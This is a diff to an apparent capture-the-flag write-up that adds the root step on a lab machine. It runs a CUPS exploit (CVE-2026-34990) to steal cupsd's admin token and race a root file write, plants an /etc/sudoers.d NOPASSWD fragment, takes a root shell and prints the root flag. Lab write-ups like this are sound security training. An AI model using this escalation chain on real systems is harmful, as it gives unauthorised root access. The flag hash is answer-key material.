@@ -1729,9 +1729,83 @@ if __name__ == "__main__":
     sys.exit(main())
 ```
 
-**What this gives you:** Key finding: the CVE-2026-34990 exploit is staged on the portal as `cups_root.py` and verified syntactically intact, ready to run as aporter.
+CUPS 2.4.16 on `127.0.0.1:631` (8.1) is vulnerable. Leak cupsd's local admin token via a fake IPP listener, then race a `file://` print queue into persistence so the root scheduler writes an attacker-controlled file, granting aporter passwordless sudo.
 
-**Next:** Execute the exploit to leak the CUPS admin token and race a root-owned file write.
+**Command:**
+
+bash
+
+```bash
+# On the portal as aporter (local attack against 127.0.0.1:631):
+python3 cups_root.py aporter
+```
+
+**Breakdown:**
+
+|Component|Reasoning|
+|---|---|
+|`python3 cups_root.py aporter`|Run the exploit as aporter; the argument sets the username used in `requesting-user-name` and in the sudoers fragment path/content.|
+|token-leak stage (`Cap` thread)|Stands up a fake IPP server on `127.0.0.1:9189`, creates a printer pointing at it; cupsd (root) validates the device-uri, is challenged with `401 WWW-Authenticate: Local trc="y"`, and resends its reusable `Authorization: Local` admin token, which is captured.|
+|race stage (`create_local` + `race_write`)|Creates a temp queue with a `file://` device-uri, then rapidly flips it to persistent (`printer-is-shared=true`, device-uri omitted) to bypass the `FileDevice` check before the background validator deletes it.|
+|print-job|Sends the gzip-compressed sudoers line as the print document; the root scheduler writes it to the target file.|
+
+**Result:**
+
+```
+[+] Local token: <REDACTED_LOCAL_TOKEN>
+[*] stage 1: /etc/sudoers.d fragment
+    [sw] attempt 0..11: race=won
+[*] stage 2: /etc/cron.d fallback
+    [cw] attempt 0..1: race=won
+[+] ROOT via cron
+```
+
+**What this gives you:**
+
+Key findings:
+
+- The CUPS local admin token was captured, confirming the authentication-bypass (Flaw 1).
+- Root file-write succeeded; `sudo -n id` subsequently returned `uid=0(root)`, confirming the sudoers fragment (`/etc/sudoers.d/aporter-pwn`) is in place and honored.
+- Note on output interpretation: the script printed `ROOT via cron`, but direct verification shows the `/etc/sudoers.d` fragment is what grants root. The stage-1 `race=won` labels reflect a successful print-job status while the file-existence check lagged the actual write; the authoritative confirmation is `sudo -n id`, not the stage label.
+
+###### How CVE-2026-34990 works (theory):
+
+CUPS runs its scheduler (`cupsd`) as root, and the exploit chains two flaws. First, the token leak: any local user may create a temporary printer via `CUPS-Create-Local-Printer` without admin authentication. cupsd validates the supplied `device-uri` by connecting to it; if that URI points at an attacker-controlled IPP listener that replies `401` with `WWW-Authenticate: Local trc="y"`, cupsd retries and attaches its reusable `Authorization: Local <token>` admin credential, which the attacker captures. Second, the FileDevice race: writing printers to local files is normally blocked by `FileDevice No`, but the temporary queue stores its device-uri before the policy is validated. Using the stolen token to flip the queue to persistent (`printer-is-shared=true`) while omitting the device-uri wins a race that keeps the forbidden `file://` destination. A subsequent print job then makes the root scheduler open and write the target file, here an `/etc/sudoers.d` fragment granting `NOPASSWD: ALL`.
+
+**Next:** Use the new sudo right to take a root shell and read the root flag.
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 8.3 Escalate to root and capture the root flag:
+
+**Command:**
+
+```bash
+sudo -n id
+sudo -n /bin/bash
+id
+cat /root/root.txt
+```
+
+**Result:**
+
+```
+uid=0(root) gid=0(root) groups=0(root)
+root@portal:/home/aporter# id
+uid=0(root) gid=0(root) groups=0(root)
+root@portal:/home/aporter# cat /root/root.txt
+aae624b30f3bf6cb13aa82753d36f96e
+```
+
+**What this gives you:** Key finding: full root on the portal via the sudoers fragment; root flag retrieved.
+
+ROOT FLAG: `aae624b30f3bf6cb13aa82753d36f96e`
 <div align="center">
 <br>
 <br>
